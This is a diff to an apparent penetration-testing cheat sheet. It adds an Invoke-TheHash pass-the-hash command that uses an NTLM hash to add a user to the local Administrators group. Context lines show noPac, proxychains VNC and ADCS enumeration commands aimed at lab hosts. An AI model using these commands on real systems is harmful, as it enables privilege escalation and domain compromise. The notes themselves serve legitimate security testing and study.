@@ -65,6 +65,7 @@
   - [DCOM](#dcom)
   - [RunasCs](#runascs)
   - [TightVNC](#tightvnc)
+  - [Invoke-TheHash](#invoke-thehash)
 - [Discovery](#discovery)
   - [Windows](#windows-3)
     - [LOLBIN](#lolbin)
@@ -1008,6 +1009,12 @@ apt-get install xtightvncviewer
 echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
 ```
 
+## Invoke-TheHash
+https://github.com/Kevin-Robertson/Invoke-TheHash
+```powershell
+Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators own_user /add"
+```
+
 # Discovery
 ## Windows
 ### LOLBIN
@@ -1767,7 +1774,6 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 --
 ```
 
 ### ADCS
-#### ESC1
 ```bash
 # find service
 nxc ldap 172.16.117.0/24 -u  -p '' -M adcs
